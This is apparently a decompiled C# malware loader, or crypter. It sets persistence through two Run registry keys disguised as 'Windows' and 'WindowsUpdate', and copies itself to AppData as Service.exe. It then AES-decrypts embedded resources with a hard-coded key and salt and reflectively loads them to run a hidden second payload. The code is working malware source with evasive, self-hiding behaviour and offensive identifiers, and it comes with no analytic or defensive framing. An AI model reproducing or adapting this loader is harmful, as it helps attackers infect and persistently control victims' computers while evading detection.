using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ChangingFucked;

internal class Program
{
	private static bool BecauseYouLovedME()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Windows", Application.get_ExecutablePath());
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Service.exe");
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey2.SetValue("WindowsUpdate", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Service.exe");
			byte[] hitler = Sex("dd92b971b62344749a66c32c2605b5ab");
			byte[] hitler2 = Sex("ae4b2c34479e4f5baff88196a8fd8dc7");
			hitler = LetsBeFucked(hitler, "FDC1898A6BD6F7DEBA6684C06F90679C", "R7意EcG8WV耳雎pC去gv8v意iIQ爾意S7q饒雎覽罷P");
			hitler2 = LetsBeFucked(hitler2, "FDC1898A6BD6F7DEBA6684C06F90679C", "R7意EcG8WV耳雎pC去gv8v意iIQ爾意S7q饒雎覽罷P");
			Assembly assembly = Assembly.Load(hitler);
			Type type = assembly.GetType("Resource.reflect");
			MethodInfo method = type.GetMethod("Apply");
			method.Invoke(null, new object[4]
			{
				Assembly.GetExecutingAssembly().Location,
				"",
				hitler2,
				false
			});
			return true;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return false;
		}
	}

	public static byte[] Sex(string filename)
	{
		ResourceManager resourceManager = new ResourceManager("e4adc0217fd947e8b96acf0995398cef", Assembly.GetExecutingAssembly());
		return (byte[])resourceManager.GetObject(filename);
	}

	private static byte[] LetsBeFucked(byte[] Hitler, string Scheetzak, string ZouteLande)
	{
		try
		{
			PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(Scheetzak, Encoding.UTF8.GetBytes(ZouteLande));
			MemoryStream memoryStream = new MemoryStream();
			Aes aes = new AesManaged();
			aes.Key = passwordDeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = passwordDeriveBytes.GetBytes(aes.BlockSize / 8);
			CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(Hitler, 0, Hitler.Length);
			cryptoStream.Close();
			return memoryStream.ToArray();
		}
		catch
		{
			Environment.Exit(0);
			return new byte[0];
		}
	}

	[STAThread]
	private static void Main(string[] args)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		new OpenFileDialog();
		for (int i = 0; i < 5; i++)
		{
			if (BecauseYouLovedME())
			{
				break;
			}
		}
	}
}
